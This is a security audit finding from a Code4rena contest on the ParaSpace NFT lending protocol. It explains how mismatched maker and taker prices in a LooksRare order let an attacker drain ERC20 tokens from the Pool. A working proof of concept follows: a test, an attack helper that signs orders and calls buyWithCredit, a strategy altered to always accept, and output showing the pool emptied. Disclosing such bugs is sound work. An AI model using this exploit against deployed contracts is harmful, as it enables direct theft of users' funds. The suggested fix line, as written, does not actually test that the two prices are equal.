---
tags:
  - lang/solidity
  - sector/lending
  - sector/nft
  - sector/nft-lending
  - sector/nft-marketplace
  - sector/stable
  - sector/staking
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - fix/use-reentrancy-guard
protocol: "[[ParaSpace]]"
auditors:
  - "[[Trust]]"
report: "https://code4rena.com/reports/2022-11-paraspace"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[use-reentrancy-guard]]"
  - "[[reentrancy-guard]]"
  - "[[timestamp-dependence]]"
  - "[[vote-delegation-loop]]"
---
# [H-10] Attacker can drain pool using executeBuyWithCredit with malicious marketplace payload

- id: 15983
- impact: HIGH
- protocol: [[ParaSpace]]
- reporter: Trust (Code4rena)
- source: https://code4rena.com/reports/2022-11-paraspace

## Summary


This bug report is about an exploit that allows an attacker to drain any ERC20 tokens that exist in the Pool contract. The exploit takes advantage of the fact that the code in the LooksRareAdapter's getAskOrderInfo does not take into account the TakerOrder parameters when constructing the consideration parameter. This means that the maker price will be reflected in the registered price charged to the user, but the taker price will be the one actually transferred from the Pool. 

The attack POC involves the attacker submitting a buyWithCredit transaction with a TakerOrder with a higher amount than the MakerOrder, and the Pool will take the difference from its own funds and send it to the Maker. This allows the attacker to end up with both the DAI and the NFT.

To mitigate this exploit, it is important to validate that the price charged to the user is the same price taken from the Pool contract. This can be done by requiring that the makerAsk.price and takerBid.price are equal in LooksRareAdapter's getAskOrderInfo.

## Details

## Lines of code

https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L59
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L397


## Vulnerability details

## Description

Paraspace supports leveraged purchases of NFTs through PoolMarketplace entry points. User calls buyWithCredit with marketplace, calldata to be sent to marketplace, and how many tokens to borrow.
```
function buyWithCredit(
    bytes32 marketplaceId,
    bytes calldata payload,
    DataTypes.Credit calldata credit,
    uint16 referralCode
) external payable virtual override nonReentrant {
    DataTypes.PoolStorage storage ps = poolStorage();
    MarketplaceLogic.executeBuyWithCredit(
        marketplaceId,
        payload,
        credit,
        ps,
        ADDRESSES_PROVIDER,
        referralCode
    );
}
```

In executeBuyWithCredit, orders are deserialized from the payload user sent to a DataTypes.OrderInfo structure. Each MarketplaceAdapter is required to fulfil that functionality through getAskOrderInfo:
```
DataTypes.OrderInfo memory orderInfo = IMarketplace(marketplace.adapter)
    .getAskOrderInfo(payload, vars.weth);
```

If we take a look at LooksRareAdapter's getAskOrderInfo, it will the consideration parameter using only the MakerOrder parameters, without taking into account TakerOrder params
```
(
    OrderTypes.TakerOrder memory takerBid,
    OrderTypes.MakerOrder memory makerAsk
) = abi.decode(params, (OrderTypes.TakerOrder, OrderTypes.MakerOrder));
orderInfo.maker = makerAsk.signer;

consideration[0] = ConsiderationItem(
    itemType,
    token,
    0,
    makerAsk.price, // TODO: take minPercentageToAsk into account
    makerAsk.price,
    payable(takerBid.taker)
);
```

The OrderInfo constructed, which contains the consideration item from maker, is used in \_delegateToPool, called by \_buyWithCredit(), called by executeBuyWithCredit:

```
for (uint256 i = 0; i < params.orderInfo.consideration.length; i++) {
    ConsiderationItem memory item = params.orderInfo.consideration[i];
    require(
        item.startAmount == item.endAmount,
        Errors.INVALID_MARKETPLACE_ORDER
    );
    require(
        item.itemType == ItemType.ERC20 ||
            (vars.isETH && item.itemType == ItemType.NATIVE),
        Errors.INVALID_ASSET_TYPE
    );
    require(
        item.token == params.credit.token,
        Errors.CREDIT_DOES_NOT_MATCH_ORDER
    );
    price += item.startAmount;
}
```

The total price is charged to msg.sender, and he will pay it with debt tokens + immediate downpayment. 
After enough funds are transfered to the Pool contract, it delegatecalls to the LooksRare adapter, which will do the actual call to LooksRareExchange. The exchange will send the money gathered in the pool to maker, and give it the NFT.

The issue is that attacker can supply a different price in the MakerOrder and TakerOrder passed as payload to LooksRare. The maker price will be reflected in the registered price charged to user, but taker price will be the one actually transferred from Pool. 

To show taker price is what counts, this is the code in LooksRareExchange.sol:
```
function matchAskWithTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)
    external
    override
    nonReentrant
{
    require((makerAsk.isOrderAsk) && (!takerBid.isOrderAsk), "Order: Wrong sides");
    require(msg.sender == takerBid.taker, "Order: Taker must be the sender");
    // Check the maker ask order
    bytes32 askHash = makerAsk.hash();
    _validateOrder(makerAsk, askHash);
    (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)
        .canExecuteTakerBid(takerBid, makerAsk);
    require(isExecutionValid, "Strategy: Execution invalid");
    // Update maker ask order status to true (prevents replay)
    _isUserOrderNonceExecutedOrCancelled[makerAsk.signer][makerAsk.nonce] = true;
    // Execution part 1/2
    _transferFeesAndFunds(
        makerAsk.strategy,
        makerAsk.collection,
        tokenId,
        makerAsk.currency,
        msg.sender,
        makerAsk.signer,
        takerBid.price,   <--- taker price is what's charged
        makerAsk.minPercentageToAsk
    );
	...
}
```

Since attacker will be both maker and taker in this flow,  he has no problem in supplying a strategy which will accept higher taker price than maker price. It will pass this check:
```
(bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)
    .canExecuteTakerBid(takerBid, makerAsk);
```

It is important to note that for this exploit we can pass a 0 credit loan amount, which allows the stolen asset to be any asset, not just ones supported by the pool. This is because of early return in \_borrowTo() and \repay() functions. 

The attack POC looks as follows:
1. Taker (attacker) has 10 DAI 
2. Pool has 990 DAI
3. Maker (attacker) has 1 doodle NFT.
4. Taker submits buyWithCredit() transaction:
- credit amount 0
- TakerOrder with 1000 amount
- MakerOrder with 10 amount and "accept all" execution strategy
5. Pool will take the 10 DAI from taker and additional 990 DAI from it's own funds and send to Maker.
6. Attacker ends up with both 1000 DAI and an nToken of the NFT

## Impact

Any ERC20 tokens which exist in the pool contract can be drained by an attacker.

## Proof of Concept

In \_pool_marketplace_buy_wtih_credit.spec.ts, add this test:
```
it("looksrare attack", async () => {
  const {
    doodles,
    dai,
    pool,
    users: [maker, taker, middleman],
  } = await loadFixture(testEnvFixture);
  const payNowNumber = "10";
  const poolVictimNumber = "990";
  const payNowAmount = await convertToCurrencyDecimals(
    dai.address,
    payNowNumber
  );
  const poolVictimAmount = await convertToCurrencyDecimals(
    dai.address,
      poolVictimNumber
  );
  const totalAmount = payNowAmount.add(poolVictimAmount);
  const nftId = 0;
  // mint DAI to offer
  // We don't need to give taker any money, he is not charged
  // Instead, give the pool money
  await mintAndValidate(dai, payNowNumber, taker);
  await mintAndValidate(dai, poolVictimNumber, pool);
  // middleman supplies DAI to pool to be borrowed by offer later
  //await supplyAndValidate(dai, poolVictimNumber, middleman, true);
  // maker mint mayc
  await mintAndValidate(doodles, "1", maker);
  // approve
  await waitForTx(
    await dai.connect(taker.signer).approve(pool.address, payNowAmount)
  );
  console.log("maker balance before", await dai.balanceOf(maker.address))
  console.log("taker balance before", await dai.balanceOf(taker.address))
  console.log("pool balance before", await dai.balanceOf(pool.address))
  await executeLooksrareBuyWithCreditAttack(
    doodles,
    dai,
    payNowAmount,
    totalAmount,
    0,
    nftId,
    maker,
    taker
  );
```

In marketplace-helper.ts, please copy in the following attack code:
```
export async function executeLooksrareBuyWithCreditAttack(
    tokenToBuy: MintableERC721 | NToken,
    tokenToPayWith: MintableERC20,
    makerAmount: BigNumber,
    takerAmount: BigNumber,
    creditAmount : BigNumberish,
    nftId: number,
    maker: SignerWithAddress,
    taker: SignerWithAddress
) {
  const signer = DRE.ethers.provider.getSigner(maker.address);
  const chainId = await maker.signer.getChainId();
  const nonce = await maker.signer.getTransactionCount();

  // approve
  await waitForTx(
      await tokenToBuy
          .connect(maker.signer)
          .approve((await getTransferManagerERC721()).address, nftId)
  );

  const now = Math.floor(Date.now() / 1000);
  const paramsValue = [];
  const makerOrder: MakerOrder = {
    isOrderAsk: true,
    signer: maker.address,
    collection: tokenToBuy.address,
    // Listed Maker price not includes payLater amount which is stolen
    price: makerAmount,
    tokenId: nftId,
    amount: "1",
    strategy: (await getStrategyStandardSaleForFixedPrice()).address,
    currency: tokenToPayWith.address,
    nonce: nonce,
    startTime: now - 86400,
    endTime: now + 86400, // 2 days validity
    minPercentageToAsk: 7500,
    params: paramsValue,
  };

  const looksRareExchange = await getLooksRareExchange();

  const {domain, value, type} = generateMakerOrderTypedData(
      maker.address,
      chainId,
      makerOrder,
      looksRareExchange.address
  );

  const signatureHash = await signer._signTypedData(domain, type, value);

  const makerOrderWithSignature: MakerOrderWithSignature = {
    ...makerOrder,
    signature: signatureHash,
  };

  const vrs = DRE.ethers.utils.splitSignature(
      makerOrderWithSignature.signature
  );

  const makerOrderWithVRS: MakerOrderWithVRS = {
    ...makerOrderWithSignature,
    ...vrs,
  };
  const pool = await getPoolProxy();
  const takerOrder: TakerOrder = {
    isOrderAsk: false,
    taker: pool.address,
    price: takerAmount,
    tokenId: makerOrderWithSignature.tokenId,
    minPercentageToAsk: 7500,
    params: paramsValue,
  };

  const encodedData = looksRareExchange.interface.encodeFunctionData(
      "matchAskWithTakerBid",
      [takerOrder, makerOrderWithVRS]
  );

  const tx = pool.connect(taker.signer).buyWithCredit(
      LOOKSRARE_ID,
      `0x${encodedData.slice(10)}`,
      {
        token: tokenToPayWith.address,
        amount: creditAmount,
        orderId: constants.HashZero,
        v: 0,
        r: constants.HashZero,
        s: constants.HashZero,
      },
      0,
      {
        gasLimit: 5000000,
      }
  );

  await (await tx).wait();
}
```

Finally, we need to change the passed execution strategy. In StrategyStandardSaleForFixedPrice.sol, change canExecuteTakerBid:
```
function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)
    external
    view
    override
    returns (
        bool,
        uint256,
        uint256
    )
{
    return (
        //((makerAsk.price == takerBid.price) &&
        //    (makerAsk.tokenId == takerBid.tokenId) &&
        //    (makerAsk.startTime <= block.timestamp) &&
        //    (makerAsk.endTime >= block.timestamp)),
        true,
        makerAsk.tokenId,
        makerAsk.amount
    );
}
```

We can see the output:
```
maker balance before BigNumber { value: "0" }
taker balance before BigNumber { value: "10000000000000000000" }
pool balance before BigNumber { value: "990000000000000000000" }
maker balance after BigNumber { value: "1000000000000000000000" }
taker balance after BigNumber { value: "0" }
pool balance after BigNumber { value: "0" }

  Leveraged Buy - Positive tests
    ✔ looksrare attack (34857ms)


  1 passing (54s)

```

## Tools Used

Manual audit

## Recommended Mitigation Steps

It is important to validate that the price charged to user is the same price taken from the Pool contract:
```
// In LooksRareAdapter's getAskOrderInfo:
require(makerAsk.price, takerBid.price)
```
